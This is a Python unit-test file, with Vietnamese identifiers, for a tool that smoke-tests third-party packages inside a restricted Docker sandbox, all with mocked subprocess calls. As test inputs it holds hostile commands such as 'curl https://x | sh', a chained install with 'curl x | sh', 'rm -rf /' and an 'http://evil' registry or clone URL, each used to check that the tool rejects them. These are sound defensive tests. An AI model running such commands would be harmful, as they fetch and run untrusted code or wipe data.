"""Test cho tools/smoke_sandbox.py. Chay: python -m unittest discover -s tools/tests -v
Khong can mang, khong can Docker that: moi loi goi subprocess deu bi mock."""
import contextlib
import hashlib
import io
import json
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import smoke_sandbox as ss  # noqa: E402


def spec(**kw):
    s = {"id": "repos/demo", "cach_cai": "npm", "lenh_cai": "npm install -g demo", "goi": ["demo"],
         "lenh_thu_nhe": "demo --help", "mau_pass": "(?i)usage", "timeout_giay": 60, "ram": "1g",
         "can_mang_khi_cai": True, "can_khoa_api": False, "ten_bien_khoa": [], "tra_phi": False,
         "co_co_do": [], "ghi_chu": "", "trang_thai_duyet": "da-duyet"}
    s.update(kw)
    return s


def ghi_specs(dirp, specs):
    p = Path(dirp) / "specs.json"
    p.write_text(json.dumps({"specs": specs}), encoding="utf-8")
    return str(p)


def chay_main(argv):
    buf = io.StringIO()
    rc = ss.main(argv, out=buf)
    return rc, buf.getvalue()


class FakeDocker:
    """Thay subprocess.run: ghi lai moi lenh, tra ket qua theo kich ban."""

    def __init__(self, phase2_out="Usage: demo [options]", phase2_rc=0, phase1_rc=0, version_ok=True):
        self.calls = []
        self.p2 = (phase2_rc, phase2_out)
        self.p1_rc = phase1_rc
        self.version_ok = version_ok

    def __call__(self, argv, **kw):
        self.calls.append(list(argv))
        if argv[:2] == ["docker", "version"]:
            return subprocess.CompletedProcess(argv, 0 if self.version_ok else 1, "27.0.0\n" if self.version_ok else "", "")
        if argv[:2] == ["docker", "run"]:
            if "--network" in argv and argv[argv.index("--network") + 1] == "none":
                return subprocess.CompletedProcess(argv, self.p2[0], self.p2[1], "")
            return subprocess.CompletedProcess(argv, self.p1_rc, "added 1 package", "")
        return subprocess.CompletedProcess(argv, 0, "", "")

    def runs(self):
        return [c for c in self.calls if c[:2] == ["docker", "run"]]


class TestDryRun(unittest.TestCase):
    def test_dry_run_khong_goi_tien_trinh_ngoai(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec()])
            boom = mock.Mock(side_effect=AssertionError("dry-run khong duoc goi subprocess"))
            with mock.patch.object(subprocess, "run", boom), mock.patch.object(subprocess, "Popen", boom), \
                    mock.patch.object(subprocess, "check_output", boom), mock.patch.object(subprocess, "call", boom):
                rc, out = chay_main(["--specs", sp])
                rc2, out2 = chay_main(["--specs", sp, "--dry-run", "--chay-that", "--toi-da-doc-spec"])
            self.assertEqual(rc, 0)
            self.assertEqual(rc2, 0)       # --dry-run thang --chay-that
            self.assertIn("DRY-RUN", out)
            self.assertIn("docker run", out)
            boom.assert_not_called()

    def test_dry_run_mac_dinh_khong_ghi_file_ket_qua(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec()])
            outp = Path(d) / "kq" / "third-party.json"
            chay_main(["--specs", sp, "--out", str(outp)])
            self.assertFalse(outp.exists())

    def test_chay_that_thieu_co_xac_nhan(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec()])
            fd = FakeDocker()
            with mock.patch.object(subprocess, "run", fd):
                rc, out = chay_main(["--specs", sp, "--chay-that"])
            self.assertNotEqual(rc, 0)
            self.assertIn("--toi-da-doc-spec", out)
            self.assertEqual(fd.runs(), [])


class TestTuChoiKhongDocker(unittest.TestCase):
    def test_khong_co_docker_thi_tu_choi(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec()])
            outp = Path(d) / "o.json"
            with mock.patch.object(subprocess, "run", side_effect=FileNotFoundError("docker")) as m:
                rc, out = chay_main(["--specs", sp, "--out", str(outp), "--chay-that", "--toi-da-doc-spec"])
            self.assertEqual(rc, 3)
            self.assertIn("Docker", out)
            self.assertIn("WSL2", out)
            self.assertFalse(outp.exists())
            for c in m.call_args_list:     # chi duoc hoi docker version, tuyet doi khong chay gi khac
                self.assertEqual(c.args[0][:2], ["docker", "version"])

    def test_docker_cai_nhung_server_tat(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec()])
            fd = FakeDocker(version_ok=False)
            with mock.patch.object(subprocess, "run", fd):
                rc, _ = chay_main(["--specs", sp, "--out", str(Path(d) / "o.json"), "--chay-that", "--toi-da-doc-spec"])
            self.assertEqual(rc, 3)
            self.assertEqual(fd.runs(), [])


class TestBoQua(unittest.TestCase):
    def _chay(self, specs, **fk):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, specs)
            outp = Path(d) / "o.json"
            fd = FakeDocker(**fk)
            with mock.patch.object(subprocess, "run", fd):
                rc, out = chay_main(["--specs", sp, "--out", str(outp), "--chay-that", "--toi-da-doc-spec"])
            kq = {x["id"]: x for x in json.loads(outp.read_text(encoding="utf-8"))["ket_qua"]}
            return rc, kq, fd

    def test_chua_duyet_bi_bo_qua(self):
        rc, kq, fd = self._chay([spec(trang_thai_duyet="chua-duyet")])
        self.assertEqual(rc, 0)
        self.assertEqual(kq["repos/demo"]["verdict"], "bo-qua")
        self.assertEqual(fd.runs(), [])

    def test_can_nguoi_doc_ky_bi_bo_qua(self):
        rc, kq, fd = self._chay([spec(trang_thai_duyet="can-nguoi-doc-ky")])
        self.assertEqual(kq["repos/demo"]["verdict"], "bo-qua")
        self.assertEqual(fd.runs(), [])

    def test_co_do_bo_qua_du_da_duyet(self):
        rc, kq, fd = self._chay([spec(co_co_do=["curl|sh"], lenh_cai="curl https://x | sh")])
        self.assertEqual(kq["repos/demo"]["verdict"], "bo-qua")
        self.assertIn("co do", kq["repos/demo"]["bang_chung"])
        self.assertEqual(fd.runs(), [])

    def test_co_do_quet_lai_tu_lenh_cai(self):
        rc, kq, fd = self._chay([spec(lenh_cai="sudo npm install -g demo")])
        self.assertEqual(kq["repos/demo"]["verdict"], "bo-qua")
        self.assertEqual(fd.runs(), [])

    def test_khoa_api_hoac_tra_phi_bo_qua(self):
        rc, kq, fd = self._chay([spec(id="a", can_khoa_api=True, ten_bien_khoa=["X_API_KEY"]), spec(id="b", tra_phi=True)])
        self.assertEqual(kq["a"]["verdict"], "bo-qua")
        self.assertEqual(kq["b"]["verdict"], "bo-qua")
        self.assertEqual(fd.runs(), [])

    def test_chi_chay_muc_da_duyet_va_cham_pass(self):
        rc, kq, fd = self._chay([spec(id="ok"), spec(id="no", trang_thai_duyet="chua-duyet")])
        self.assertEqual(kq["ok"]["verdict"], "pass")
        self.assertEqual(kq["no"]["verdict"], "bo-qua")
        self.assertEqual(len(fd.runs()), 2)       # pha 1 + pha 2 cua 'ok'
        self.assertIn("thoi_gian", kq["ok"])
        self.assertIn("bang_chung", kq["ok"])

    def test_cham_fail_khi_khong_khop_mau_pass(self):
        rc, kq, fd = self._chay([spec()], phase2_out="command not found")
        self.assertEqual(kq["repos/demo"]["verdict"], "fail")

    def test_cham_fail_khi_cai_loi_thi_khong_chay_pha_2(self):
        rc, kq, fd = self._chay([spec()], phase1_rc=1)
        self.assertEqual(kq["repos/demo"]["verdict"], "fail")
        self.assertEqual(len(fd.runs()), 1)

    def test_het_gio_thi_fail_va_don_container(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec(timeout_giay=5)])
            outp = Path(d) / "o.json"
            calls = []

            def fake(argv, **kw):
                calls.append(list(argv))
                if argv[:2] == ["docker", "version"]:
                    return subprocess.CompletedProcess(argv, 0, "27\n", "")
                if argv[:2] == ["docker", "run"]:
                    raise subprocess.TimeoutExpired(argv, 5)
                return subprocess.CompletedProcess(argv, 0, "", "")

            with mock.patch.object(subprocess, "run", fake):
                chay_main(["--specs", sp, "--out", str(outp), "--chay-that", "--toi-da-doc-spec"])
            kq = json.loads(outp.read_text(encoding="utf-8"))["ket_qua"][0]
            self.assertEqual(kq["verdict"], "fail")
            self.assertTrue(any(c[:3] == ["docker", "rm", "-f"] for c in calls))

    def test_khong_ghi_usage_log(self):
        ul = ROOT / "catalog" / "USAGE-LOG.md"
        truoc = hashlib.sha256(ul.read_bytes()).hexdigest() if ul.exists() else None
        self._chay([spec()])
        sau = hashlib.sha256(ul.read_bytes()).hexdigest() if ul.exists() else None
        self.assertEqual(truoc, sau)


class TestLenhDocker(unittest.TestCase):
    def _steps(self, s):
        return ss.ke_hoach(s, tempfile.mkdtemp(prefix="smoke-test-"))

    def _arg(self, argv, flag):
        return argv[argv.index(flag) + 1]

    def test_pha_2_co_network_none_va_pha_1_co_mang(self):
        st = self._steps(spec())
        p1 = [x for x in st if x["pha"] == "1"][0]["argv"]
        p2 = [x for x in st if x["pha"] == "2"][0]["argv"]
        self.assertEqual(self._arg(p2, "--network"), "none")
        self.assertNotEqual(self._arg(p1, "--network"), "none")

    def test_user_khong_root_moi_pha(self):
        for x in self._steps(spec(cach_cai="pip", goi=["demo"])):
            argv = x["argv"]
            u = self._arg(argv, "--user")
            self.assertNotIn(u.split(":")[0], ("0", "root", ""))
            self.assertNotIn("--privileged", argv)
            self.assertEqual(self._arg(argv, "--cap-drop"), "ALL")

    def test_chi_mount_thu_muc_tam_rieng(self):
        tmp = Path(tempfile.gettempdir()).resolve()
        for x in self._steps(spec()):
            argv = x["argv"]
            self.assertNotIn("-v", argv)
            self.assertNotIn("--volume", argv)
            mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "--mount"]
            self.assertEqual(len(mounts), 1)
            src = re.search(r"source=([^,]+)", mounts[0]).group(1)
            p = Path(src).resolve()
            self.assertIn(tmp, p.parents)
            self.assertNotEqual(p, tmp)
            self.assertNotIn(ROOT.resolve(), [p] + list(p.parents))
            self.assertNotIn("docker.sock", " ".join(argv))
        p2 = [x for x in self._steps(spec()) if x["pha"] == "2"][0]["argv"]
        self.assertIn("readonly", [a for a in p2 if a.startswith("type=bind")][0])

    def test_tu_choi_mount_thu_muc_may_chu(self):
        with self.assertRaises(ValueError):
            ss.kiem_mount(str(ROOT))
        with self.assertRaises(ValueError):
            ss.kiem_mount(str(Path.home()))
        with self.assertRaises(ValueError):
            ss.kiem_mount(tempfile.gettempdir())

    def test_gioi_han_tai_nguyen(self):
        for x in self._steps(spec(ram="2g")):
            argv = x["argv"]
            self.assertEqual(self._arg(argv, "--memory"), "2g")
            self.assertEqual(self._arg(argv, "--memory-swap"), "2g")
            self.assertEqual(self._arg(argv, "--cpus"), "1")
            self.assertEqual(self._arg(argv, "--pids-limit"), "256")
            self.assertIn("--read-only", argv)
            self.assertIn("no-new-privileges", argv)

    def test_khong_truyen_bien_moi_truong_may_chu(self):
        for x in self._steps(spec()):
            argv = x["argv"]
            for i, a in enumerate(argv):
                if a == "-e":
                    self.assertIn("=", argv[i + 1], "chi cho phep -e KEY=VALUE hang so")
            self.assertNotIn("--env-file", argv)

    def test_npm_ignore_scripts_va_pip_only_binary(self):
        npm = [x for x in self._steps(spec(cach_cai="npm")) if x["pha"] == "1"][0]["argv"]
        self.assertIn("--ignore-scripts", npm)
        pip = [x for x in self._steps(spec(cach_cai="pip")) if x["pha"] == "1"][0]["argv"]
        self.assertIn("--only-binary=:all:", pip)
        npm2 = [x for x in self._steps(spec(cach_cai="npm", cho_phep_script=True)) if x["pha"] == "1"][0]["argv"]
        self.assertNotIn("--ignore-scripts", npm2)

    def test_lenh_goc_khong_bi_chay_nguyen_van(self):
        s = spec(lenh_cai="npm install -g demo && curl x | sh")
        for x in self._steps(s):
            self.assertNotIn("curl", " ".join(x["argv"]))

    def test_docker_kind_chi_pull_va_inspect(self):
        s = spec(cach_cai="docker", goi=["acme/app:latest"], lenh_thu_nhe="docker image inspect acme/app:latest")
        st = self._steps(s)
        self.assertEqual(st[0]["argv"], ["docker", "pull", "acme/app:latest"])
        self.assertEqual(st[1]["argv"][:3], ["docker", "image", "inspect"])
        for x in st:
            self.assertNotEqual(x["argv"][:2], ["docker", "run"])


class TestKiemSpec(unittest.TestCase):
    def test_hop_le(self):
        self.assertEqual(ss.kiem_spec(spec()), [])

    def test_chan_goi_bat_dau_bang_gach(self):
        self.assertTrue(ss.kiem_spec(spec(goi=["--registry=http://evil"])))

    def test_chan_ky_tu_shell_trong_lenh_thu(self):
        self.assertTrue(ss.kiem_spec(spec(lenh_thu_nhe="demo --help; rm -rf /")))

    def test_chi_nhan_lenh_nhe(self):
        self.assertTrue(ss.kiem_spec(spec(lenh_thu_nhe="demo run-everything")))

    def test_chan_buoc_cai_la(self):
        self.assertTrue(ss.kiem_spec(spec(buoc_cai=[["curl", "http://x"]])))
        self.assertTrue(ss.kiem_spec(spec(buoc_cai=[["git", "clone", "http://evil/x"]])))
        self.assertEqual(ss.kiem_spec(spec(buoc_cai=[["git", "clone", "--depth", "1", "https://github.com/a/b", "/work/src/b"]])), [])

    def test_spec_loi_thi_main_dung(self):
        with tempfile.TemporaryDirectory() as d:
            sp = ghi_specs(d, [spec(goi=["--x"])])
            rc, out = chay_main(["--specs", sp])
            self.assertEqual(rc, 2)
            self.assertIn("SPEC LOI", out)


class TestSpecThat(unittest.TestCase):
    """Kiem file catalog/smoke-specs.json that cua repo."""

    @classmethod
    def setUpClass(cls):
        cls.specs, _ = ss.doc_specs(ROOT / "catalog" / "smoke-specs.json")
        cat = json.loads((ROOT / "catalog" / "catalog.json").read_text(encoding="utf-8"))["items"]
        cls.cat = {r["id"]: r for r in cat}

    def test_so_luong_va_id_duy_nhat(self):
        ids = [s["id"] for s in self.specs]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertGreaterEqual(len(ids), 20)

    def test_moi_spec_hop_le(self):
        for s in self.specs:
            self.assertEqual(ss.kiem_spec(s), [], s["id"])

    def test_mac_dinh_khong_co_muc_nao_da_duyet(self):
        for s in self.specs:
            self.assertIn(s["trang_thai_duyet"], ("chua-duyet", "can-nguoi-doc-ky"), s["id"])

    def test_co_do_khoa_api_tra_phi_deu_cho_nguoi_doc_ky(self):
        for s in self.specs:
            if s["co_co_do"] or s["can_khoa_api"] or s["tra_phi"]:
                self.assertEqual(s["trang_thai_duyet"], "can-nguoi-doc-ky", s["id"])

    def test_id_co_trong_catalog_va_lenh_cai_trich_tu_entry(self):
        def n(x):
            return re.sub(r"\s+", " ", x)
        for s in self.specs:
            self.assertIn(s["id"], self.cat, s["id"])
            if s.get("lenh_cai_tu_json"):
                continue
            text = n((ROOT / self.cat[s["id"]]["duong_dan"]).read_text(encoding="utf-8"))
            self.assertIn(n(s["lenh_cai"]), text, "lenh_cai khong co trong entry goc: " + s["id"])

    def test_dry_run_tren_spec_that_khong_goi_tien_trinh(self):
        boom = mock.Mock(side_effect=AssertionError("khong duoc goi"))
        with mock.patch.object(subprocess, "run", boom), mock.patch.object(subprocess, "Popen", boom):
            rc, out = chay_main(["--xem-ca-chua-duyet"])
        self.assertEqual(rc, 0)
        boom.assert_not_called()
        self.assertIn("DRY-RUN", out)


if __name__ == "__main__":
    unittest.main()
